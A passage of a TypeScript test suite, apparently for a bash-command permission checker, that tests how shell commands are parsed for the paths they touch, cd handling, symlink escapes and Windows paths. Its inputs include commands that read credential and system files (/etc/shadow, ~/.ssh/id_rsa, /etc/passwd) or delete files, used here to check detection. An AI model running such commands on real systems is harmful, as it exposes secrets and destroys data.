import { homedir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

// Mock node:fs so realpathSync (used by canonicalizePath) is controllable.
// Default is identity so all existing lexical tests are unaffected.
// Every other fs binding passes through to the real module, so filesystem-
// backed helpers (lstatSync, mkdtempSync, symlinkSync, …) stay usable here.
const realpathSync = vi.hoisted(() =>
  vi.fn<(path: string) => string>((p) => p),
);
vi.mock("node:fs", async () => {
  const actual = await vi.importActual<typeof import("node:fs")>("node:fs");
  return {
    ...actual,
    realpathSync,
    default: { ...actual, realpathSync },
  };
});

import { BashProgram } from "#src/access-intent/bash/program";
import { UNPROVEN_EFFECT } from "#src/access-intent/effect";
import { pathFlavorForPlatform, win32PathFlavor } from "#src/path/path-flavor";
import { PathNormalizer } from "#src/path-normalizer";
import { createTmpFixture } from "#test/helpers/tmp-fixture";

describe("BashProgram", () => {
  describe("pathRuleCandidates", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    describe("operands of nested commands hosted in a redirect (#741)", () => {
      it("projects the operand of a redirect-hosted command", async () => {
        const program = await BashProgram.parse(
          "echo hi > $(cat /etc/shadow)",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "/etc/shadow",
        ]);
      });

      it("does not promote a bare inner token that names nothing", async () => {
        const program = await BashProgram.parse(
          "echo hi > $(rm nonexistent-file)",
          normalizer,
        );
        expect(program.pathRuleCandidates()).toEqual([]);
      });
    });

    describe("operands a statement names directly (#839)", () => {
      it("projects a for loop's word-list operand", async () => {
        const program = await BashProgram.parse(
          "for f in /etc/shadow; do cat $f; done",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "/etc/shadow",
        ]);
      });

      it("projects a case subject", async () => {
        const program = await BashProgram.parse(
          "case /etc/shadow in a) echo b;; esac",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "/etc/shadow",
        ]);
      });

      it("leaves a case arm's pattern unprojected", async () => {
        // A `case` pattern is a glob matched against the subject string, not a
        // path anything touches.
        const program = await BashProgram.parse(
          "case $x in /etc/passwd) echo b;; esac",
          normalizer,
        );
        expect(program.pathRuleCandidates()).toEqual([]);
      });

      it("resolves a word-list operand against the effective directory", async () => {
        const program = await BashProgram.parse(
          "cd nested && for f in src/file.txt; do echo; done",
          normalizer,
        );
        const candidate = program
          .pathRuleCandidates()
          .find(({ token }) => token === "src/file.txt");
        expect(candidate?.path.matchValues()).toEqual([
          "/projects/my-app/nested/src/file.txt",
          "nested/src/file.txt",
          "src/file.txt",
        ]);
      });

      it("attributes a statement operand as unproven", async () => {
        const program = await BashProgram.parse(
          "for f in /etc/shadow; do echo; done",
          normalizer,
        );
        expect(
          program.pathRuleCandidates().map(({ effect }) => effect),
        ).toEqual([UNPROVEN_EFFECT]);
      });
    });

    describe("operands of a command hosted in a prefix position (#742)", () => {
      it.each([
        ["a substitution as the whole command", "$(cat /etc/shadow)"],
        ["a backtick substitution as the whole command", "`cat /etc/shadow`"],
        [
          "a substitution in a while condition",
          "while $(cat /etc/shadow); do echo a; done",
        ],
        [
          "a substitution in an if condition",
          "if $(cat /etc/shadow); then echo a; fi",
        ],
        [
          "a substitution in an until condition",
          "until $(cat /etc/shadow); do echo a; done",
        ],
        [
          "a substitution in an env-var prefix",
          "FOO=$(cat /etc/shadow) echo hi",
        ],
        [
          "a substitution in the env-var prefix of a pattern-first command",
          "FOO=$(cat /etc/shadow) grep -f p x",
        ],
      ])("projects the operand of %s", async (_label, command) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(
          program.pathRuleCandidates().map(({ token }) => token),
        ).toContain("/etc/shadow");
      });

      it("leaves a prefix assignment's literal value unprojected", async () => {
        // The value is assigned, never accessed — only a *hosted execution* in
        // that position runs, and only its operands are candidates.
        const program = await BashProgram.parse(
          "FOO=/etc/shadow echo hi",
          normalizer,
        );
        expect(program.pathRuleCandidates()).toEqual([]);
      });

      it("projects an argument-position operand exactly as before", async () => {
        const program = await BashProgram.parse(
          "echo $(cat /etc/shadow)",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "/etc/shadow",
        ]);
      });
    });

    it("adds absolute and relative policy values for relative tokens", async () => {
      const program = await BashProgram.parse("cat src/foo.ts", normalizer);
      const candidates = program.pathRuleCandidates();
      expect(candidates.map(({ token }) => token)).toEqual(["src/foo.ts"]);
      expect(candidates[0].path.matchValues()).toEqual([
        "/projects/my-app/src/foo.ts",
        "src/foo.ts",
      ]);
      expect(candidates[0].path.value()).toBe("/projects/my-app/src/foo.ts");
    });

    it("resolves tokens after literal cd against the effective directory", async () => {
      const program = await BashProgram.parse(
        "cd nested && cat src/file.txt",
        normalizer,
      );
      const fileCandidate = program
        .pathRuleCandidates()
        .find((candidate) => candidate.token === "src/file.txt");
      expect(fileCandidate?.path.matchValues()).toEqual([
        "/projects/my-app/nested/src/file.txt",
        "nested/src/file.txt",
        "src/file.txt",
      ]);
      expect(fileCandidate?.path.value()).toBe(
        "/projects/my-app/nested/src/file.txt",
      );
    });

    it("adds the canonical alias for a symlinked token (#486)", async () => {
      // /projects/my-app/src/foo.ts is a symlink to /vault/foo.ts.
      realpathSync.mockImplementation((p: string) =>
        p === "/projects/my-app/src/foo.ts" ? "/vault/foo.ts" : p,
      );
      const program = await BashProgram.parse("cat src/foo.ts", normalizer);
      const candidate = program.pathRuleCandidates()[0];
      expect(candidate.path.matchValues()).toEqual([
        "/projects/my-app/src/foo.ts",
        "src/foo.ts",
        "/vault/foo.ts",
      ]);
    });

    it("does not absolute-allow relative tokens after unknown cd", async () => {
      const program = await BashProgram.parse(
        'cd "$DIR" && cat src/foo.ts',
        normalizer,
      );
      const fileCandidate = program
        .pathRuleCandidates()
        .find((candidate) => candidate.token === "src/foo.ts");
      expect(fileCandidate?.path.matchValues()).toEqual(["src/foo.ts"]);
      expect(fileCandidate?.path.value()).toBe("src/foo.ts");
    });

    it("keeps an unknown-cd token literal-only even when it would resolve a symlink (#393)", async () => {
      // A canonical alias here would resolve against the wrong (unknown) base.
      realpathSync.mockImplementation(() => "/somewhere/else");
      const program = await BashProgram.parse(
        'cd "$DIR" && cat src/foo.ts',
        normalizer,
      );
      const fileCandidate = program
        .pathRuleCandidates()
        .find((candidate) => candidate.token === "src/foo.ts");
      expect(fileCandidate?.path.matchValues()).toEqual(["src/foo.ts"]);
      expect(fileCandidate?.path.boundaryValue()).toBe("");
    });

    describe("glob-bearing path tokens (#821)", () => {
      it("projects a bracket glob in a relative token", async () => {
        const program = await BashProgram.parse(
          "cat src/[s]ecret.env",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "src/[s]ecret.env",
        ]);
      });

      it("projects a dot-star glob in an absolute token", async () => {
        const program = await BashProgram.parse(
          "rm -rf /tmp/tmp.*",
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "/tmp/tmp.*",
        ]);
      });
    });

    describe("existence-probe bare-token promotion (#645)", () => {
      // Candidacy comes from the filesystem, so these run against a real
      // tmpdir cwd with real lstat/realpath rather than the fake cwd above.
      const tmp = createTmpFixture();
      let root: string;
      let probeNormalizer: PathNormalizer;

      beforeEach(async () => {
        const actual =
          await vi.importActual<typeof import("node:fs")>("node:fs");
        realpathSync.mockImplementation(actual.realpathSync);
        // Canonicalize the root: on macOS the tmpdir is itself a symlink, so a
        // lexical root would disagree with every canonical form derived below.
        root = actual.realpathSync(tmp.dir("pi-perm-bash-"));
        probeNormalizer = new PathNormalizer(
          pathFlavorForPlatform(process.platform),
          root,
        );
      });

      afterEach(() => {
        tmp.cleanup();
      });

      it("promotes a bare token naming an existing file", async () => {
        tmp.file(root, "id_rsa", "key");
        const program = await BashProgram.parse("cat id_rsa", probeNormalizer);
        const candidates = program.pathRuleCandidates();
        expect(candidates.map(({ token }) => token)).toEqual(["id_rsa"]);
        expect(candidates[0].path.matchValues()).toEqual([
          join(root, "id_rsa"),
          "id_rsa",
        ]);
      });

      it("drops a bare token naming nothing — `git status` stays silent (#509)", async () => {
        const program = await BashProgram.parse("git status", probeNormalizer);
        expect(program.pathRuleCandidates()).toHaveLength(0);
      });

      it("drops every bare word of a command referencing no real file", async () => {
        const program = await BashProgram.parse(
          "npm run build && git checkout main",
          probeNormalizer,
        );
        expect(program.pathRuleCandidates()).toHaveLength(0);
      });

      it("promotes a bare symlink and carries its target as a match value", async () => {
        // The issue's second repro shape: a_sym -> .some.secret, where the rule
        // names the target. Raw-token matching could never see this.
        const secret = tmp.file(root, ".some.secret", "s3cret");
        tmp.symlink(root, "a_sym", secret);
        const program = await BashProgram.parse("cat a_sym", probeNormalizer);
        const candidate = program
          .pathRuleCandidates()
          .find((c) => c.token === "a_sym");
        expect(candidate?.path.matchValues()).toContain(
          join(root, ".some.secret"),
        );
      });

      it("promotes a bare token naming a directory", async () => {
        tmp.subdir(root, "vault");
        const program = await BashProgram.parse("ls vault", probeNormalizer);
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "vault",
        ]);
      });

      it("promotes a dangling symlink — the link is the named operand", async () => {
        tmp.symlink(root, "dangling", join(root, "gone"));
        const program = await BashProgram.parse(
          "cat dangling",
          probeNormalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "dangling",
        ]);
      });

      it("keeps a promoted token literal-only after an unknown cd (#393)", async () => {
        tmp.file(root, "id_rsa", "key");
        const program = await BashProgram.parse(
          'cd "$DIR" && cat id_rsa',
          probeNormalizer,
        );
        // An unknown base cannot be probed against a known directory, so the
        // token stays unpromoted rather than resolving against the wrong cwd.
        expect(program.pathRuleCandidates()).toHaveLength(0);
      });

      it("does not double-promote a token the shape gate already accepts", async () => {
        tmp.file(root, "id_rsa", "key");
        const program = await BashProgram.parse(
          "cat ./id_rsa",
          probeNormalizer,
        );
        expect(program.pathRuleCandidates()).toHaveLength(1);
      });

      it("probes a bare token against the effective directory after a literal cd", async () => {
        const nested = tmp.subdir(root, "nested");
        tmp.file(nested, "inner.txt", "x");
        const program = await BashProgram.parse(
          "cd nested && cat inner.txt",
          probeNormalizer,
        );
        const candidate = program
          .pathRuleCandidates()
          .find((c) => c.token === "inner.txt");
        expect(candidate?.path.matchValues()).toContain(
          join(root, "nested", "inner.txt"),
        );
      });

      it("consults no policy — promotion needs no matcher argument", async () => {
        tmp.file(root, "id_rsa", "key");
        const program = await BashProgram.parse("cat id_rsa", probeNormalizer);
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "id_rsa",
        ]);
      });
    });

    describe("resolved shell expansions (#694)", () => {
      it("resolves ${HOME}/… instead of fabricating a cwd-relative path", async () => {
        const program = await BashProgram.parse(
          'ls "${HOME}/somewhere"',
          normalizer,
        );
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          join(homedir(), "somewhere"),
        ]);
      });

      it("keeps a $PWD token literal-only after a non-literal cd", async () => {
        // `$PWD` becomes the base-relative `.`, so it inherits the #393
        // unknown-base treatment rather than resolving against the wrong
        // directory — and never fabricates `<cwd>/$PWD/x`.
        const program = await BashProgram.parse(
          'cd "$DIR" && ls "$PWD/x"',
          normalizer,
        );
        const candidate = program
          .pathRuleCandidates()
          .find(({ token }) => token === "./x");
        expect(candidate?.path.matchValues()).toEqual(["./x"]);
        expect(candidate?.path.boundaryValue()).toBe("");
      });

      it("leaves a variable outside the resolvable set unresolved", async () => {
        const program = await BashProgram.parse('ls "$CONFIG/x"', normalizer);
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          "$CONFIG/x",
        ]);
      });
    });
  });

  describe("externalPaths", () => {
    const cwd = "/projects/my-app";
    const normalizer = new PathNormalizer(
      pathFlavorForPlatform(process.platform),
      cwd,
    );

    beforeEach(() => {
      realpathSync.mockReset();
      realpathSync.mockImplementation((p: string) => p);
    });

    it("returns absolute paths resolving outside cwd", async () => {
      const program = await BashProgram.parse("cat /etc/hosts", normalizer);
      // Subset matcher: the path is normalized before comparison.
      expect(
        program.externalAccesses().map(({ path }) => path.value()),
      ).toContain("/etc/hosts");
    });

    describe("operands a statement names directly (#839)", () => {
      it("flags a for loop's absolute word-list operand", async () => {
        const program = await BashProgram.parse(
          "for f in /etc/shadow; do cat $f; done",
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual(["/etc/shadow"]);
      });

      it("flags a for loop's home-relative word-list operand", async () => {
        // The issue's motivating repro: the body carries only `$f`, so the word
        // list is the sole place the literal appears.
        const program = await BashProgram.parse(
          "for f in ~/other/secret; do cat $f; done",
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual([join(homedir(), "other/secret")]);
      });

      it("flags an absolute case subject", async () => {
        const program = await BashProgram.parse(
          "case /etc/shadow in a) echo b;; esac",
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual(["/etc/shadow"]);
      });

      it("leaves an in-cwd word-list operand off the external slice", async () => {
        const program = await BashProgram.parse(
          "for f in src/main.ts; do echo; done",
          normalizer,
        );
        expect(program.externalAccesses()).toEqual([]);
      });
    });

    describe("glob-bearing path tokens (#821)", () => {
      it.each([
        ["a bracket glob", "cat /etc/[p]asswd", "/etc/[p]asswd"],
        [
          "a bracket glob inside a directory name",
          "ls /et[c]/pa*",
          "/et[c]/pa*",
        ],
        ["a dot-star glob", "rm -rf /tmp/tmp.*", "/tmp/tmp.*"],
      ])("projects %s outside the tree", async (_label, command, expected) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual([expected]);
      });
    });

    describe("flag spellings of a pattern-first command (#823)", () => {
      it.each([
        ["a spaced numeric flag argument", "grep -A 3 pattern /etc/passwd"],
        ["an expansion flag argument", "grep -A $N pattern /etc/passwd"],
        ["an =-embedded pattern flag", "grep --regexp=harmless /etc/passwd"],
        ["a glued short pattern flag", "grep -eharmless /etc/passwd"],
        ["a GNU in-place edit", "sed -i 's/a/b/' /etc/passwd"],
      ])("projects the file operand behind %s", async (_label, command) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual(["/etc/passwd"]);
      });

      it("does not project a pattern flag's own value", async () => {
        const program = await BashProgram.parse(
          "grep --regexp=/etc/passwd file.txt",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });
    });

    describe("operands of nested commands hosted in a redirect (#741)", () => {
      it.each([
        ["a redirect destination", "echo hi > $(cat /etc/shadow)"],
        ["an appending destination", "echo hi >> $(cat /etc/shadow)"],
        ["an input process substitution", "cat < <(cat /etc/shadow)"],
        ["a concatenated destination", "echo hi > ${DIR}/$(cat /etc/shadow)"],
      ])("projects an operand hosted in %s", async (_label, command) => {
        const program = await BashProgram.parse(command, normalizer);
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toContain("/etc/shadow");
      });

      it("still projects a plain redirect destination", async () => {
        const program = await BashProgram.parse(
          "echo hi > /etc/passwd",
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toContain("/etc/passwd");
      });
    });

    describe("bare tokens escaping the tree via symlink (#645)", () => {
      const tmp = createTmpFixture();
      let root: string;
      let probeNormalizer: PathNormalizer;
      // Canonical temp dir: on macOS the tmpdir is itself a symlink, so a
      // lexical path would disagree with every canonical form under assertion.
      let canonicalDir: (prefix: string) => string;

      beforeEach(async () => {
        const actual =
          await vi.importActual<typeof import("node:fs")>("node:fs");
        realpathSync.mockImplementation(actual.realpathSync);
        canonicalDir = (prefix) => actual.realpathSync(tmp.dir(prefix));
        root = canonicalDir("pi-perm-ext-cwd-");
        probeNormalizer = new PathNormalizer(
          pathFlavorForPlatform(process.platform),
          root,
        );
      });

      afterEach(() => {
        tmp.cleanup();
      });

      it("flags an in-project bare symlink whose target is outside cwd", async () => {
        // The issue's headline repro:
        //   printf 'test' > /tmp/pi-permission-test-secret
        //   ln -s /tmp/pi-permission-test-secret outside-link
        //   cat outside-link
        const outsideRoot = canonicalDir("pi-perm-ext-target-");
        const secret = tmp.file(outsideRoot, "pi-permission-test-secret", "s");
        tmp.symlink(root, "outside-link", secret);

        const program = await BashProgram.parse(
          "cat outside-link",
          probeNormalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.boundaryValue()),
        ).toContain(secret);
      });

      it("does not flag a bare token resolving inside cwd", async () => {
        tmp.file(root, "inside.txt", "x");
        const program = await BashProgram.parse(
          "cat inside.txt",
          probeNormalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("does not flag a bare word naming nothing", async () => {
        const program = await BashProgram.parse("git status", probeNormalizer);
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("flags a bare symlink to an outside directory", async () => {
        const outsideRoot = canonicalDir("pi-perm-ext-dir-");
        tmp.symlink(root, "vault", outsideRoot);
        const program = await BashProgram.parse("ls vault", probeNormalizer);
        expect(
          program.externalAccesses().map(({ path }) => path.boundaryValue()),
        ).toContain(outsideRoot);
      });
    });

    it("flags a path embedded in a long option (#645)", async () => {
      // The issue's second repro: `grep --file=…` under an allowing `grep *`
      // rule. The flag token is rejected by the shape prelude, so the value is
      // split out at collection and classified on its own.
      const program = await BashProgram.parse(
        "grep --file=/tmp/pi-permission-patterns target",
        normalizer,
      );
      expect(
        program.externalAccesses().map(({ path }) => path.value()),
      ).toContain("/tmp/pi-permission-patterns");
    });

    it("excludes paths within cwd", async () => {
      const program = await BashProgram.parse("cat src/index.ts", normalizer);
      expect(program.externalAccesses()).toHaveLength(0);
    });

    describe("win32 projection (injected platform, no vi.mock node:path)", () => {
      const winNormalizer = new PathNormalizer(
        win32PathFlavor,
        "C:\\Projects\\App",
      );

      it("expands $HOME before any platform-specific token handling", async () => {
        // Expansion happens at collection, upstream of the flavor, so the
        // token the projection carries is the expanded path on every host.
        const program = await BashProgram.parse('ls "$HOME/x"', winNormalizer);
        expect(program.pathRuleCandidates().map(({ token }) => token)).toEqual([
          `${homedir()}/x`,
        ]);
      });

      it("keeps a non-mount POSIX absolute literal (Git Bash semantics)", async () => {
        // On win32, Pi core runs Git Bash: /etc is an MSYS install-root path,
        // not C:\etc, so it is matched and displayed as typed (#533).
        const program = await BashProgram.parse(
          "cat /etc/hosts",
          winNormalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual(["/etc/hosts"]);
      });

      it("keeps a non-mount POSIX absolute as a literal rule candidate", async () => {
        const program = await BashProgram.parse("cat /tmp/foo", winNormalizer);
        const candidate = program.pathRuleCandidates()[0];
        expect(candidate.path.matchValues()).toEqual(["/tmp/foo"]);
      });

      it("folds a drive-mount cd so a following traversal resolves under it", async () => {
        // cd /c/Other → base C:\Other; ../x resolves to C:\x (not C:\c\x).
        // The cd argument itself is also collected and translated (c:\other).
        const program = await BashProgram.parse(
          "cd /c/Other && cat ../x",
          winNormalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual(["c:\\other", "c:\\x"]);
      });

      it("degrades a non-mount POSIX absolute cd to a conservative unknown base", async () => {
        // Git Bash's /tmp is install-dependent, so `cd /tmp` makes the base
        // unresolvable; a following traversal is flagged conservatively against
        // cwd for display, and /tmp itself is a literal external path (#533).
        const program = await BashProgram.parse(
          "cd /tmp && cat ../x",
          winNormalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual(["/tmp", "c:\\projects\\x"]);
      });

      it("flags a ..-traversal escaping cwd under win32 rules", async () => {
        const program = await BashProgram.parse(
          "cat ../sibling/x",
          winNormalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual(["c:\\projects\\sibling\\x"]);
      });

      it("folds a current-shell cd so an in-cwd ..-traversal is not flagged", async () => {
        const program = await BashProgram.parse(
          "cd sub && cat ../x",
          winNormalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("recognizes a backslash-relative token as a path rule candidate (#520)", async () => {
        const program = await BashProgram.parse("cat dir\\file", winNormalizer);
        const candidate = program.pathRuleCandidates()[0];
        expect(candidate.token).toBe("dir\\file");
      });

      it("resolves a backslash-relative token to the same win32 aliases its forward-slash equivalent matches (#520)", async () => {
        const backslashProgram = await BashProgram.parse(
          "cat dir\\file",
          winNormalizer,
        );
        const forwardSlashProgram = await BashProgram.parse(
          "cat dir/file",
          winNormalizer,
        );
        const backslashAliases = backslashProgram
          .pathRuleCandidates()[0]
          .path.matchValues();
        // The backslash token resolves to the canonical win32 path plus its
        // win32-normalized relative alias.
        expect(backslashAliases).toEqual([
          "c:\\projects\\app\\dir\\file",
          "dir\\file",
        ]);
        // The forward-slash equivalent carries the same aliases plus a redundant
        // raw "dir/file" that folds to "dir\file" under win32 separator folding,
        // so every path rule matches both forms identically (#520).
        const forwardSlashAliases = forwardSlashProgram
          .pathRuleCandidates()[0]
          .path.matchValues();
        for (const alias of backslashAliases) {
          expect(forwardSlashAliases).toContain(alias);
        }
      });
    });

    describe("posix backslash-relative tokens stay bare (#520)", () => {
      it("does not treat a backslash-relative token as a path rule candidate on posix", async () => {
        const program = await BashProgram.parse("cat dir\\file", normalizer);
        expect(program.pathRuleCandidates()).toHaveLength(0);
      });
    });

    describe("resolved shell expansions (#694)", () => {
      it("flags $HOME/… whose target does not exist", async () => {
        // The token expands to an absolute path before classification, so the
        // strict gate accepts it by shape — no longer dependent on the #645
        // existence probe rescuing it.
        const program = await BashProgram.parse(
          'touch "$HOME/pi-permission-system-repro-new"',
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual([join(homedir(), "pi-permission-system-repro-new")]);
      });

      it("flags a bare ${HOME}", async () => {
        const program = await BashProgram.parse('ls "${HOME}"', normalizer);
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual([homedir()]);
      });

      it("flags ${HOME}/…", async () => {
        const program = await BashProgram.parse(
          'ls "${HOME}/somewhere"',
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual([join(homedir(), "somewhere")]);
      });

      it("flags a $HOME redirect destination", async () => {
        const program = await BashProgram.parse(
          "echo hi > $HOME/out.txt",
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual([join(homedir(), "out.txt")]);
      });

      it("yields exactly one entry for an existing $HOME target", async () => {
        // Previously the existence probe promoted this token; now the strict
        // shape gate accepts it. It must not be collected through both.
        const program = await BashProgram.parse('ls "$HOME"', normalizer);
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual([homedir()]);
      });

      it("gives $HOME/… and its literal spelling the same projection", async () => {
        const expanded = await BashProgram.parse(
          `ls "${join(homedir(), "docs")}"`,
          normalizer,
        );
        const spelled = await BashProgram.parse('ls "$HOME/docs"', normalizer);
        expect(
          spelled.externalAccesses().map(({ path }) => path.value()),
        ).toEqual(expanded.externalAccesses().map(({ path }) => path.value()));
      });

      it("resolves $HOME/… independently of an unknown effective base", async () => {
        const program = await BashProgram.parse(
          'cd "$DIR" && cat "$HOME/.ssh/id_rsa"',
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual([join(homedir(), ".ssh/id_rsa")]);
      });

      it("resolves $PWD against the cd-folded base", async () => {
        // `/etc` is flagged by the `cd` argument token itself, as it is for any
        // absolute `cd` target; `$PWD/passwd` contributes the second entry.
        const program = await BashProgram.parse(
          'cd /etc && ls "$PWD/passwd"',
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toEqual(["/etc", "/etc/passwd"]);
      });

      it("does not flag a $PWD token that stays inside the working directory", async () => {
        const program = await BashProgram.parse('ls "$PWD/src"', normalizer);
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("does not resolve an expansion carrying an operator", async () => {
        const program = await BashProgram.parse(
          'ls "${HOME:-/tmp}/x"',
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("does not resolve a variable through an assignment (accepted residual)", async () => {
        // ADR 0009 keeps assignment-then-reference an accepted residual; this
        // pins the declined behavior so a future change is a deliberate one.
        const program = await BashProgram.parse(
          'CURRENT="$HOME"; ls "$CURRENT"',
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });
    });

    describe("effective working directory projection", () => {
      it("folds a sequence of current-shell cd commands", async () => {
        // cd a → cwd/a, cd b → cwd/a/b; ../c resolves to cwd/a/c (inside).
        const program = await BashProgram.parse(
          "cd a && cd b && cat ../c",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("catches an escape masked by a later cd that the single-base model missed", async () => {
        // Effective dir after `cd nested/deep && cd ..` is cwd/nested, so
        // ../../etc/passwd escapes to /projects/etc/passwd.
        const program = await BashProgram.parse(
          "cd nested/deep && cd .. && cat ../../etc/passwd",
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toContain("/projects/etc/passwd");
      });

      it("folds a cd that is not the first command", async () => {
        // The single-base model ignored a cd that was not first; now `cd a`
        // folds, so ../b resolves to cwd/b (inside) and is not flagged.
        const program = await BashProgram.parse(
          "mkdir d && cd a && cat ../b",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("does not fold a backgrounded cd", async () => {
        // `cd a &` runs in a subshell, so it must not update the running
        // directory; ../b resolves against cwd and escapes.
        const program = await BashProgram.parse("cd a & cat ../b", normalizer);
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toContain("/projects/b");
      });

      it("does not fold a cd inside a pipeline", async () => {
        // Pipeline members run in subshells; the cd must not leak.
        const program = await BashProgram.parse(
          "cd nested | cat ../b",
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toContain("/projects/b");
      });

      it("folds a cd inside a subshell for paths within that subshell", async () => {
        // Inside the subshell the effective dir is cwd/sub, so ../x → cwd/x.
        const program = await BashProgram.parse(
          "( cd sub && cat ../x )",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("does not leak a subshell cd to following commands", async () => {
        // The subshell cd resets on exit, so ../y resolves against cwd.
        const program = await BashProgram.parse(
          "( cd sub ) && cat ../y",
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toContain("/projects/y");
      });

      it("persists a cd inside a brace group to later commands in the group", async () => {
        // Brace groups run in the current shell, so cd sub persists to cat ../x.
        const program = await BashProgram.parse(
          "{ cd sub; cat ../x; }",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("persists a brace-group cd to following sibling commands", async () => {
        const program = await BashProgram.parse(
          "{ cd sub; } && cat ../x",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("conservatively flags a relative path inside a command substitution", async () => {
        // Interior cd folding inside substitutions is deferred: the interior
        // inherits the enclosing base (cwd), so ../r is flagged rather than
        // resolved against cwd/q. Conservative — never misses an escape.
        const program = await BashProgram.parse(
          "echo $(cd q && cat ../r)",
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toContain("/projects/r");
      });

      it("flags relative paths conservatively after a non-literal cd", async () => {
        // cd "$DIR" makes the effective dir unknowable; ../x could be anywhere,
        // so it is flagged (least-privilege).
        const program = await BashProgram.parse(
          'cd "$DIR" && cat ../x',
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toContain("/projects/x");
      });

      it("flags even a within-cwd relative path after a non-literal cd", async () => {
        // Conservative cost: src/../within.txt resolves inside cwd but is still
        // flagged because the effective dir is unknown.
        const program = await BashProgram.parse(
          'cd "$DIR" && cat src/../within.txt',
          normalizer,
        );
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toContain("/projects/my-app/within.txt");
      });

      it("still resolves an absolute path normally after a non-literal cd", async () => {
        // Absolute paths are base-independent; one inside cwd is not flagged
        // even when the effective dir is unknown.
        const program = await BashProgram.parse(
          'cd "$DIR" && cat /projects/my-app/x.txt',
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("treats `cd -` as an unknown effective directory", async () => {
        const program = await BashProgram.parse("cd - && cat ../x", normalizer);
        expect(
          program.externalAccesses().map(({ path }) => path.value()),
        ).toContain("/projects/x");
      });

      it("recovers a known base when a later cd is absolute", async () => {
        // cd "$DIR" → unknown, then cd /projects/my-app/src → known again, so
        // ../x resolves to cwd and is not flagged.
        const program = await BashProgram.parse(
          'cd "$DIR" && cd /projects/my-app/src && cat ../x',
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("folds a leading current-shell cd across a redirect-then-pipe", async () => {
        // tree-sitter-bash groups `cd a && pnpm x 2>&1 | tail` as
        // `(cd a && pnpm x 2>&1) | tail`, burying the current-shell `cd a`
        // inside a `pipeline` node. Bash precedence (`|` binds tighter than
        // `&&`) makes `cd a` current-shell, so the fold must persist past the
        // pipeline: ../b resolves against cwd/a (inside), not cwd (#454).
        const program = await BashProgram.parse(
          "cd a && pnpm x 2>&1 | tail ; cat ../b",
          normalizer,
        );
        expect(program.externalAccesses()).toHaveLength(0);
      });

      it("persists the fold past a redirect-then-pipe to a later cd", async () => {
        // The issue reproduction: the fold from `cd a/b` survives the
        // redirect-then-pipe, so the trailing `cd .. && cd ..` lands back at
        // cwd instead of escaping one level above.
